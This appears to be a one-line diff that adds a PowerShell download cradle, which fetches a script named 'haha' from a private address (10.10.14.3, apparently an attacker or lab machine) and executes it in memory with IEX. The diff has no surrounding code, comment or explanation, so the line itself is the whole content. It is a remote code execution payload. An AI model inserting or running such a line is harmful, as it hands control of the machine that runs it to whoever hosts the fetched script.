@@ -1,0 +1,1 @@
+IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.3/haha")
